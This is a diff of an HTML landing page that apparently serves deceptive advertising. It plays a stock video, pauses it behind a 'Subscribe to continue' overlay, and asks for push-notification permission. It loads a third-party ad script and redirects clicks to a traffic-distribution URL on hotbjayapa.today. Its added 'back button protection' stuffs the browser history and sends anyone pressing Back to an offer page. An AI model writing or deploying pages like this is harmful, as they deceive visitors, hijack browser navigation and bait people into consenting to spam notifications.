@@ -23,15 +23,16 @@
         overflow: hidden;
         z-index: 1;
     }
-    #videoFrame {
+    #myVideo {
         position: absolute;
         top: 50%;
         left: 50%;
+        min-width: 100%;
+        min-height: 100%;
+        width: auto;
+        height: auto;
         transform: translate(-50%, -50%);
-        width: 100%;
-        height: 100%;
-        border: none;
-        pointer-events: none;
+        object-fit: cover;
     }
     #overlay {
         position: absolute;
@@ -46,15 +47,6 @@
     }
     #overlay.show {
         opacity: 1;
-    }
-    #clickArea {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: 1;
-        cursor: pointer;
     }
     #subscribeBtn {
         position: absolute;
@@ -91,8 +83,10 @@
 </head>
 <body>
 <div id="videoContainer">
-    <iframe id="videoFrame" src="https://drive.google.com/file/d/1vQyzBuAsTze-RdFdAWAoWgltiQNetNTs/preview" allow="autoplay"></iframe>
-    <div id="clickArea"></div>
+    <video id="myVideo" autoplay muted playsinline loop>
+        <source src="https://cdn.pixabay.com/video/2024/02/25/201545-917327263_large.mp4" type="video/mp4">
+        Your browser does not support HTML5 video.
+    </video>
     <div id="overlay"></div>
     <div id="subscribeBtn">Subscribe to continue</div>
 </div>
@@ -100,47 +94,68 @@
 <script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>
 
 <script>
+const video = document.getElementById('myVideo');
 const btn = document.getElementById('subscribeBtn');
 const overlay = document.getElementById('overlay');
-const clickArea = document.getElementById('clickArea');
 const urlParams = new URLSearchParams(window.location.search);
 const clickId = urlParams.get('clickid') || '';
-const targetUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;
+const backButtonUrl = 'https://hotbjayapa.today/tds?id=1556334684&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
+const forwardUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;
 
-// Show overlay and button after short delay
-setTimeout(() => {
+// Show overlay and button when video starts
+video.addEventListener('playing', () => {
+    setTimeout(() => {
+        video.pause();
+        overlay.classList.add('show');
+        btn.classList.add('show');
+        
+        // Request push notification
+        setTimeout(() => {
+            if ('Notification' in window && Notification.permission === 'default') {
+                Notification.requestPermission();
+            }
+        }, 250);
+    }, 100);
+}, { once: true });
+
+// Ensure video plays
+video.play().catch(() => {
+    // If autoplay fails, show button immediately
     overlay.classList.add('show');
     btn.classList.add('show');
-    
-    // Request push notification permission
-    setTimeout(() => {
-        if ('Notification' in window && Notification.permission === 'default') {
-            Notification.requestPermission();
-        }
-    }, 250);
-}, 100);
+});
 
-// Continue and redirect function
+// Continue and redirect
 function continueAndRedirect(e) {
     if (e) e.preventDefault();
     
     btn.classList.remove('show');
     overlay.classList.remove('show');
+    video.play();
     
     setTimeout(() => {
-        window.location.href = targetUrl;
+        window.location.href = forwardUrl;
     }, 300);
 }
 
-// Event listeners
-clickArea.addEventListener('click', continueAndRedirect);
+video.addEventListener('click', continueAndRedirect);
 btn.addEventListener('click', continueAndRedirect);
 
-// Back button protection
-history.pushState(null, null, location.href);
-window.onpopstate = function() {
-    history.pushState(null, null, location.href);
-};
+// BACK BUTTON PROTECTION - redirect to offer page
+(function() {
+    let historyCount = 0;
+    
+    // Add multiple history entries
+    for (let i = 0; i < 3; i++) {
+        history.pushState(null, null, location.href);
+        historyCount++;
+    }
+    
+    window.addEventListener('popstate', function(e) {
+        history.pushState(null, null, location.href);
+        window.location.replace(backButtonUrl);
+    });
+})();
 </script>
 </body>
 </html>
